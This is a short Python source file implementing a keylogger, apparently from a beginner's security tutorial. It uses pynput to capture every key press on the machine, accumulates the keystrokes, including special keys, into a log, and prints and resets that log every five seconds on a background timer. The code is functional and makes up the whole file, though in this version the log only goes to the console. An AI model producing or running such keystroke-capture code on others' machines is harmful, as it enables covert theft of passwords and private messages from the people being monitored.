#! /usr/bin/env python
import pynput.keyboard #allows to monitor and control  keyboard
import threading    #for concurrent execution of two or more processes


class Keylogger:
    def __init__(self):
        self.log= ""
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key =  " "
            else:
                current_key =  " " + str(key) + " "
        self.append_to_log(current_key)
         # a function which outputs the keys pressed by the user

    def report(self):   # reports the keystrokes to the user without interrupting the keyboard listener as it runs on a seperate thread
        print(self.log)
        self.log = ""
        timer = threading.Timer(5,self.report)
        timer.start()
    def start(self):
        keyboardListener=pynput.keyboard.Listener(on_press=self.process_key_press) # creating a listner object
        with keyboardListener:    # using to interact with unmanaged stream of data
            self.report()
            keyboardListener.join()
